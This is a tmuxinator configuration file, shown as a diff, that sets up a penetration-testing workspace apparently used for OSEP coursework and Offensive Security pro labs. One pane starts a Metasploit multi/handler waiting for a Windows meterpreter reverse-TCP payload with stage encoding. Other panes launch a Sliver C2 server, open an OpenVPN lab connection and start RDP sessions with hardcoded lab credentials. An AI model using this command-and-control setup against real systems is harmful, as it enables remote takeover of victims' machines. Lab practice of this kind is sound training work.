@@ -1,0 +1,82 @@
+# /home/kali/.config/tmuxinator/osep.yml
+#1: bash* (4 panes) [235x50] [layout 28da,235x50,0,0{117x50,0,0[117x25,0,0,0,117x24,0,26,2],117x50,118,0[117x25,118,0,1,117x24,118,26,3]}] @0 (active)
+#2: bash- (2 panes) [235x50] [layout 37ea,235x50,0,0{117x50,0,0,4,117x50,118,0,5}] @1
+
+
+name: osep
+root: ~/Desktop/osep/temp
+
+# Optional tmux socket
+# socket_name: foo
+
+# Note that the pre and post options have been deprecated and will be replaced by
+# project hooks.
+
+# Project hooks
+
+# Runs on project start, always
+# on_project_start: command
+
+# Run on project start, the first time
+# on_project_first_start: command
+
+# Run on project start, after the first time
+# on_project_restart: command
+
+# Run on project exit ( detaching from tmux session )
+# on_project_exit: command
+
+# Run on project stop
+# on_project_stop: command
+
+# Runs in each window and pane before window/pane specific commands. Useful for setting up interpreter versions.
+# pre_window: rbenv shell 2.0.0-p247
+
+# Pass command line options to tmux. Useful for specifying a different tmux.conf.
+# tmux_options: -f ~/.tmux.mac.conf
+
+# Change the command to call tmux.  This can be used by derivatives/wrappers like byobu.
+# tmux_command: byobu
+
+# Specifies (by name or index) which window will be selected on project startup. If not set, the first window is used.
+# startup_window: editor
+
+# Specifies (by index) which pane of the specified window will be selected on project startup. If not set, the first pane is used.
+# startup_pane: 1
+
+# Controls whether the tmux session should be attached to automatically. Defaults to true.
+# attach: false
+
+windows:
+  - main:
+      layout: 28da,235x50,0,0{117x50,0,0[117x25,0,0,0,117x24,0,26,2],117x50,118,0[117x25,118,0,1,117x24,118,26,3]}
+      # Synchronize all panes of this window, can be enabled before or after the pane commands run.
+      # 'before' represents legacy functionality and will be deprecated in a future release, in favour of 'after'
+      # synchronize: after
+      panes:
+        - sudo systemctl start smbd && sudo systemctl start nmbd && sudo service ssh start && sudo systemctl start sliver && sliver
+          #- sudo python3 -m http.server 80
+        - sudo service apache2 restart && sudo tail -f /var/log/apache2/access.log
+        - sudo msfconsole -q -x "set AutoRunScript multi_console_command -r /home/kali/Desktop/osep/autoruncommands.rc;use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 192.168.1.22;set lport 8443;set exitfunc thread;set EnableStageEncoding true;set StageEncoder x64/xor_dynamic;run -j -z"
+        - sudo openvpn ../pro_labs_inlixan.ovpn
+  - main:
+      layout: 37ea,235x50,0,0{117x50,0,0,4,117x50,118,0,5}
+      # Synchronize all panes of this window, can be enabled before or after the pane commands run.
+      # 'before' represents legacy functionality and will be deprecated in a future release, in favour of 'after'
+      # synchronize: after
+      panes:
+        - xfreerdp /cert-ignore /compression /auto-reconnect /u:nina /p:Password123! /v:172.16.63.183
+        - rdesktop 192.168.63.12 -u Offsec -p lab -g 90%
+  - main:
+      layout: 37ea,235x50,0,0{117x50,0,0,4,117x50,118,0,5}
+      # Synchronize all panes of this window, can be enabled before or after the pane commands run.
+      # 'before' represents legacy functionality and will be deprecated in a future release, in favour of 'after'
+      # synchronize: after
+      panes:
+        #- sudo posh-server
+        #- sudo posh-server
+        - echo test
+        - echo test
+
+
+
